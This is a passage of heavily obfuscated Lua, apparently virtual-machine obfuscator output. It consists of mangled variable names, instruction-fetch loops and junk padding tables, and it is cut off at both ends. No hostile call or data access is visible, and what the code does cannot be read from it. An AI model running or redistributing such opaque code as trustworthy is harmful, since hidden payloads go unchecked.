111";}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DU")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("pJr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ob")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rgC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ch08")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("q4")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("7m9")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fy")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("hI3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lQ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eWJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lQCx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rS")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fi2")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("9CNi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Iq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VJS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("vhNv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MQ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UPp")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yK8D")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("krK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("vfz0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("05")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("tGp")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pi")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("c3J")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D97")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{768;979;693;315};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{260;631;950;132};"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oIT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uF")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("BSi")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("RyR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ke")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("zv4")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5k")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("6Fu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("p8lD")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zg")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("8nx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("y0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GOi")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("u2SO")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{333;110;840;809};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("KGB")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("XA")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lr2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5Bd")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VQQe")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Nd")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jD9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("SXHs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dF")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YIG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Diyr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7m")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9qA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("grLq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ph")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PhC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("FMj3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("9J")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("04")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("J6I")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5A")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("76g")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("y5kj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{569;346;503;956};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("DTv")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8i")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("B1Q")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("XI")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oBU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{521;334;920;568};}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("iBm")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("87")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("fDg")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G1uL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{285;588;809;569};}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("009")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("c2")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jr3")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QAut")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hS")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5X8")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WO")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("BAn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("67")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("44I")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("G6GP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nL")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C6X")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gL4I")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mD")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BtO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{39;321;509;706};"1 + 1 = 111";"1 + 1 = 111";{479;556;667;876};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ve")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Uof")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("iGWe")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0k")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("ZNq")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qk")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("TMv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8EK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("WNxu")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ek")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("C2I")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{145;812;957;991};{879;533;736;197};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("m6z")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ic")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4sb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{623;2;354;32};"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("dnt")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("30")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("NVC")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LYWx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kq")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("SDc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("iV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jLG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("R6r3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("R4")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("IyZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sl")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("xxs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("V55")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IgFh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lc")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("03K")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("XbMf")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2C")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MxJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oAMn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Di")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rGG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("jNpk")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("1d")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("b3S")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("r6")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZVI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("26")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AfN")]][